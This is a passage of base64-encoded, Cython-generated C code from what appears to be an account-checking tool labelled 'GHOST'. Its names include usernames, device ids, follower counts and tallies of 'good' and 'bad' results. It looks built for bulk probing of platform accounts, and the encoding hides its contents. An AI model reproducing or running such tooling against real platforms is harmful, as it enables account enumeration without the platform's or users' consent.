JFRihfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyMDksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTQgPCAwKSkpIF9fUFlYX0VSUigwLCAyMDksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICBpZiAoX19weXhfdF8xNCkge1xuXG4gICAgICAgICAgICAgIFxuICAgICAgICAgICAgICBfX3B5eF90XzEwID0gX19weXhfdl9zZWxmO1xuICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2RpZ307XG4gICAgICAgICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5jcmVtZW50X2NvdW50ZXIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDItX19weXhfdF83KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIxMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG5cbiAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX3B5eF92X3NlbGY7XG4gICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICAgICAgX19weXhfdF83ID0gMDtcbiAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzEwLCBfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdW5rbm93bn07XG4gICAgICAgICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSW5mb0FjYywgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMy1fX3B5eF90XzcpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjExLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcblxuICAgICAgICAgICAgICBcbiAgICAgICAgICAgICAgZ290byBfX3B5eF9MMTI7XG4gICAgICAgICAgICB9XG5cbiAgICAgICAgICAgIFxuICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fcHl4X3Zfc2VsZjtcbiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgICAgICBfX3B5eF90XzcgPSAwO1xuICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9maWx0ZXJlZH07XG4gICAgICAgICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5jcmVtZW50X2NvdW50ZXIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDItX19weXhfdF83KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIxMywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBfX3B5eF9MMTI6O1xuXG4gICAgICAgICAgICBcbiAgICAgICAgICAgIGdvdG8gX19weXhfTDExO1xuICAgICAgICAgIH1cblxuICAgICAgICAgIFxuICAgICAgICAgICB7XG4gICAgICAgICAgICBfX3B5eF90XzEwID0gX19weXhfdl9zZWxmO1xuICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgICAgX19weXhfdF83ID0gMDtcbiAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9maWx0ZXJlZH07XG4gICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luY3JlbWVudF9jb3VudGVyLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIxNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fcHl4X0wxMTo7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfTDEwOjtcblxuICAgICAgICBcbiAgICAgICAgZ290byBfX3B5eF9MOTtcbiAgICAgIH1cblxuICAgICAgXG4gICAgICAge1xuICAgICAgICBfX3B5eF90XzEwID0gX19weXhfdl9zZWxmO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMCk7XG4gICAgICAgIF9fcHl4X3RfNyA9IDA7XG4gICAgICAgIHtcbiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9nbX07XG4gICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5jcmVtZW50X2NvdW50ZXIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDItX19weXhfdF83KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIxNywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgIH1cbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICB9XG4gICAgICBfX3B5eF9MOTo7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBnb3RvIF9fcHl4X0w4X3RyeV9lbmQ7XG4gICAgX19weXhfTDNfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG5cbiAgICBcbiAgICBfX3B5eF90XzE1ID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcygoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSkpO1xuICAgIGlmIChfX3B5eF90XzE1KSB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULmNoZWNrIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzYsICZfX3B5eF90XzEwLCAmX19weXhfdF80KSA8IDApIF9fUFlYX0VSUigwLCAyMTgsIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX3B5eF92X2UgPSBfX3B5eF90XzEwO1xuICAgICAgIHtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfdF81ID0gTlVMTDtcbiAgICAgICAgX19weXhfdF83ID0gMTtcbiAgICAgICAge1xuICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VffTtcbiAgICAgICAgICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X2J1aWx0aW5fcHJpbnQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDItX19weXhfdF83KSB8IChfX3B5eF90XzcqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDIxOSwgX19weXhfTDE4X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzUgPSBfX3B5eF92X3NlbGY7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgICBfX3B5eF90XzcgPSAwO1xuICAgICAgICB7XG4gICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9nbX07XG4gICAgICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5jcmVtZW50X2NvdW50ZXIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDItX19weXhfdF83KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAyMjAsIF9fcHl4X0wxOF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgIH1cblxuICAgICAgXG4gICAgICAge1xuICAgICAgICB7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7XG4gICAgICAgICAgZ290byBfX3B5eF9MMTk7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfTDE4X2Vycm9yOjtcbiAgICAgICAge1xuICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICAgICAgX19weXhfdF8xOCA9IDA7IF9fcHl4X3RfMTkgPSAwOyBfX3B5eF90XzIwID0gMDsgX19weXhfdF8yMSA9IDA7IF9fcHl4X3RfMjIgPSAwOyBfX3B5eF90XzIzID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmX19weXhfdF8yMSwgJl9fcHl4X3RfMjIsICZfX3B5eF90XzIzKTtcbiAgICAgICAgICBpZiAoIHVubGlrZWx5KF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xOCwgJl9fcHl4X3RfMTksICZfX3B5eF90XzIwKSA8IDApKSBfX1B5eF9FcnJGZXRjaCgmX19weXhfdF8xOCwgJl9fcHl4X3RfMTksICZfX3B5eF90XzIwKTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTgpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIwKTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjEpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMik7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIzKTtcbiAgICAgICAgICBfX3B5eF90XzE1ID0gX19weXhfbGluZW5vOyBfX3B5eF90XzE2ID0gX19weXhfY2xpbmVubzsgX19weXhfdF8xNyA9IF9fcHl4X2ZpbGVuYW1lO1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIxKTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIyKTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIzKTtcbiAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzIxLCBfX3B5eF90XzIyLCBfX3B5eF90XzIzKTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE4KTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE5KTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIwKTtcbiAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKF9fcHl4X3RfMTgsIF9fcHl4X3RfMTksIF9fcHl4X3RfMjApO1xuICAgICAgICAgIF9fcHl4X3RfMTggPSAwOyBfX3B5eF90XzE5ID0gMDsgX19weXhfdF8yMCA9IDA7IF9fcHl4X3RfMjEgPSAwOyBfX3B5eF90XzIyID0gMDsgX19weXhfdF8yMyA9IDA7XG4gICAgICAgICAgX19weXhfbGluZW5vID0gX19weXhfdF8xNTsgX19weXhfY2xpbmVubyA9IF9fcHl4X3RfMTY7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfdF8xNztcbiAgICAgICAgICBnb3RvIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjtcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF9MMTk6O1xuICAgICAgfVxuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgIH1cbiAgICBnb3RvIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjtcblxuICAgIFxuICAgIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MNF9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7XG4gICAgX19weXhfTDhfdHJ5X2VuZDo7XG4gIH1cblxuICBcblxuICBcbiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgZ290byBfX3B5eF9MMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5jaGVjayIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19weXhfTDA6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdWEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZGV2KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RldmljZV9pZCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl91dWkpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaGVhZGVycyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9kYXRhKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3Jlc3BvbnNlKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3VzZXJuYW1lKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2ZvbGxvd2VyX2NvdW50KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0dF81R0hPU1RfMTdyZXN0KFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJ0dF81R0hPU1RfMTdyZXN0ID0geyJyZXN0IiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ydHRfNUdIT1NUXzE3cmVzdCwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF8xN3Jlc3QoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbikge1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYgPSAwO1xuICBQeU9iamVjdCAqX19weXhfdl91c2VyID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJyZXN0ICh3cmFwcGVyKSIsIDApO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7XG4gICNlbHNlXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICNlbmRpZlxuICAjZW5kaWZcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7XG4gIHtcbiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZWxmLCZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlciwwfTtcbiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDtcbiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDIyMiwgX19weXhfTDNfZXJyb3IpXG4gICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkge1xuICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykge1xuICAgICAgICBjYXNlICAyOlxuICAgICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDIyMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAyMjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfY